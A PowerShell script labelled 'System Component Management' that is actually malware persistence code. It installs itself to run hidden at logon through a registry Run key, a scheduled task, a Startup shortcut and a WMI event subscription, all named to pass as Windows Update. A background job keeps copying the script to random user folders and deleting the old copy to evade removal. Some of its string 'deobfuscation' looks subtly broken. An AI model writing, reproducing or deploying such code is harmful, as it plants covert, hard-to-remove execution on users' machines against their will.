<#
.SYNOPSIS
    System Component Management
.DESCRIPTION
    System component initialization and management
#>

# Obfuscated function names and strings
$ObfuscatedStrings = @{
    "RegistryPath" = "SEtDdTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"
    "ServiceName" = "V2luZG93c1VwZGF0ZVNlcnZpY2U="
    "TaskName" = "V2luZG93cyBTeXN0ZW0gVXBkYXRl"
    "StartupPath" = "JGVudjpBUFBEQVRBX01pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cA=="
    "ShortcutName" = "U3lzdGVtVXBkYXRlLmxuaw=="
}

function ConvertFrom-StealthString {
    param([string]$EncodedString)
    try {
        $Bytes = [System.Convert]::FromBase64String($EncodedString)
        $Key = [System.Text.Encoding]::UTF8.GetBytes("PersistenceKey2024")
        $Result = @()
        for ($i = 0; $i -lt $Bytes.Length; $i++) {
            $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
        }
        return [System.Text.Encoding]::UTF8.GetString($Result)
    } catch { return $EncodedString }
}

function Set-SystemPersistence {
    param([hashtable]$Config)
    
    try {
        $Success = $false
        
        # Obfuscated registry persistence
        if (Set-StealthRegistryPersistence) {
            $Success = $true
        }
        
        # Obfuscated task scheduler persistence
        if (Set-StealthTaskPersistence) {
            $Success = $true
        }
        
        # Obfuscated startup folder persistence
        if (Set-StealthStartupPersistence) {
            $Success = $true
        }
        
        # Obfuscated WMI persistence
        if (Set-StealthWMIPersistence) {
            $Success = $true
        }
        
        return $Success
    } catch {
        return $false
    }
}

function Set-StealthRegistryPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $RegistryPath = ConvertFrom-StealthString -EncodedString $ObfuscatedStrings.RegistryPath
        $ServiceName = ConvertFrom-StealthString -EncodedString $ObfuscatedStrings.ServiceName
        
        $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        
        Set-ItemProperty -Path $RegistryPath -Name $ServiceName -Value $Command -Force
        
        return $true
    } catch {
        return $false
    }
}

function Set-StealthTaskPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $TaskName = ConvertFrom-StealthString -EncodedString $ObfuscatedStrings.TaskName
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        
        return $true
    } catch {
        return $false
    }
}

function Set-StealthStartupPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $StartupPath = ConvertFrom-StealthString -EncodedString $ObfuscatedStrings.StartupPath
        $ShortcutName = ConvertFrom-StealthString -EncodedString $ObfuscatedStrings.ShortcutName
        
        if (-not (Test-Path $StartupPath)) {
            New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null
        }
        
        $ShortcutPath = Join-Path $StartupPath $ShortcutName
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        
        return $true
    } catch {
        return $false
    }
}

function Set-StealthWMIPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        
        $EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            EventNameSpace = "root\cimv2"
            Name = "SystemUpdateFilter"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
            QueryLanguage = "WQL"
        }
        
        $EventConsumer = Set-WmiInstance -Class __EventConsumer -Namespace "root\subscription" -Arguments @{
            Name = "SystemUpdateConsumer"
            CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        }
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $EventFilter
            Consumer = $EventConsumer
        } | Out-Null
        
        return $true
    } catch {
        return $false
    }
}

function Start-StealthMovement {
    param([int]$Interval = 600)
    
    Start-Job -ScriptBlock {
        param($Interval, $ScriptPath)
        
        while ($true) {
            Start-Sleep -Seconds $Interval
            
            try {
                $Locations = @(
                    "$env:TEMP",
                    "$env:USERPROFILE\Documents",
                    "$env:USERPROFILE\Downloads",
                    "$env:USERPROFILE\Desktop",
                    "$env:APPDATA\Local\Temp"
                )
                
                $TargetDir = $Locations | Get-Random
                $RandomName = "SystemUpdate" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
                $TargetPath = Join-Path $TargetDir $RandomName
                
                Copy-Item -Path $ScriptPath -Destination $TargetPath -Force
                
                $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                $ServiceName = "WindowsUpdateService"
                $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TargetPath`" -Silent"
                Set-ItemProperty -Path $RegistryPath -Name $ServiceName -Value $Command -Force
                
                Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
                
            } catch {
                # Continue silently
            }
        }
    } -ArgumentList $Interval, $MyInvocation.MyCommand.Path | Out-Null
} 